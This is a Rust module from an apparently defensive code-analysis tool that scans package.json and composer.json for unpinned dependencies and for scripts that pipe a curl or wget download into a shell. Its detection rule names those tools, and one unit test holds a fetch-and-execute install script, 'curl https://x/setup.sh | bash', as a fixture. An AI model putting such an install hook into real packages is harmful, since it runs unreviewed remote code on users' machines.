//! `.json` extraction (§5.4) — package.json, composer.json, tsconfig.
//!
//! No tree-sitter needed: `serde_json` is sufficient and gives us
//! structure for free. The extractor flags the most common manifest-level
//! risks (npm/composer wildcard versions, scripts that look dangerous).

use std::path::Path;

use anyhow::Result;
use serde_json::Value;

use super::types::{ExtractMethod, FactTable};

pub fn extract_json_facts(path: &Path, source: &str) -> Result<FactTable> {
    let mut warnings = Vec::new();

    match serde_json::from_str::<Value>(source) {
        Ok(value) => scan(path, &value, &mut warnings),
        Err(e) => {
            warnings.push(format!("JSON parse error: {e}"));
        }
    }

    warnings.sort();
    warnings.dedup();

    Ok(FactTable {
        file: path.to_path_buf(),
        language: super::types::Language::default(),
        functions: vec![],
        warnings,
        callers: vec![],
        // Although we used serde_json instead of tree-sitter, the result
        // is still structure-aware so the TreeSitter tag is appropriate
        // (red teams treat it as full-precision facts).
        extract_method: ExtractMethod::TreeSitter,
        fingerprints: vec![],
    })
}

fn scan(path: &Path, value: &Value, warnings: &mut Vec<String>) {
    let file_name = path
        .file_name()
        .and_then(|n| n.to_str())
        .map(str::to_lowercase)
        .unwrap_or_default();

    if file_name == "package.json" {
        scan_package_json(value, warnings);
    } else if file_name == "composer.json" {
        scan_composer_json(value, warnings);
    }
}

fn scan_package_json(value: &Value, warnings: &mut Vec<String>) {
    // Wildcard or `*` versions in dependencies.
    for key in &["dependencies", "devDependencies", "peerDependencies"] {
        let Some(Value::Object(deps)) = value.get(key) else {
            continue;
        };
        for (name, ver) in deps {
            if let Value::String(s) = ver {
                if s == "*" || s.starts_with("git") {
                    warnings.push(format!(
                        "{key}.{name} = \"{s}\" — unpinned/git dependency"
                    ));
                }
            }
        }
    }

    // Scripts that look like remote-fetch-and-execute.
    if let Some(Value::Object(scripts)) = value.get("scripts") {
        for (name, cmd) in scripts {
            if let Value::String(s) = cmd {
                let lower = s.to_lowercase();
                if (lower.contains("curl") || lower.contains("wget"))
                    && (lower.contains("| sh") || lower.contains("| bash"))
                {
                    warnings.push(format!(
                        "scripts.{name} pipes a remote download into a shell"
                    ));
                }
            }
        }
    }
}

fn scan_composer_json(value: &Value, warnings: &mut Vec<String>) {
    for key in &["require", "require-dev"] {
        let Some(Value::Object(deps)) = value.get(key) else {
            continue;
        };
        for (name, ver) in deps {
            if let Value::String(s) = ver {
                if s == "*" || s.starts_with("dev-") {
                    warnings.push(format!(
                        "{key}.{name} = \"{s}\" — unpinned / dev-branch dependency"
                    ));
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn package_json_wildcard_dep_is_flagged() {
        let src = r#"{ "dependencies": { "foo": "*" } }"#;
        let table = extract_json_facts(&PathBuf::from("package.json"), src).unwrap();
        assert!(
            table.warnings.iter().any(|w| w.contains("foo")),
            "expected wildcard warning, got: {:?}",
            table.warnings
        );
    }

    #[test]
    fn package_json_git_dep_is_flagged() {
        let src = r#"{ "dependencies": { "foo": "git+https://github.com/x/y" } }"#;
        let table = extract_json_facts(&PathBuf::from("package.json"), src).unwrap();
        assert!(
            table.warnings.iter().any(|w| w.contains("foo")),
            "expected git warning, got: {:?}",
            table.warnings
        );
    }

    #[test]
    fn package_json_curl_pipe_script_is_flagged() {
        let src = r#"{
            "scripts": { "install": "curl https://x/setup.sh | bash" }
        }"#;
        let table = extract_json_facts(&PathBuf::from("package.json"), src).unwrap();
        assert!(
            table.warnings.iter().any(|w| w.contains("scripts.install")),
            "expected curl|bash script warning, got: {:?}",
            table.warnings
        );
    }

    #[test]
    fn composer_json_dev_branch_is_flagged() {
        let src = r#"{ "require": { "vendor/pkg": "dev-master" } }"#;
        let table = extract_json_facts(&PathBuf::from("composer.json"), src).unwrap();
        assert!(
            table.warnings.iter().any(|w| w.contains("dev-master")),
            "expected dev-branch warning, got: {:?}",
            table.warnings
        );
    }

    #[test]
    fn malformed_json_does_not_panic() {
        let src = "{ this is not json";
        let table = extract_json_facts(&PathBuf::from("config.json"), src).unwrap();
        assert!(
            table.warnings.iter().any(|w| w.contains("parse error")),
            "expected parse error warning, got: {:?}",
            table.warnings
        );
    }

    #[test]
    fn non_manifest_json_is_silent() {
        // Non-package/composer JSON (config files, data) shouldn't
        // generate noise — we just visit the file.
        let src = r#"{ "foo": "bar" }"#;
        let table = extract_json_facts(&PathBuf::from("config.json"), src).unwrap();
        assert!(table.warnings.is_empty(), "got: {:?}", table.warnings);
    }
}
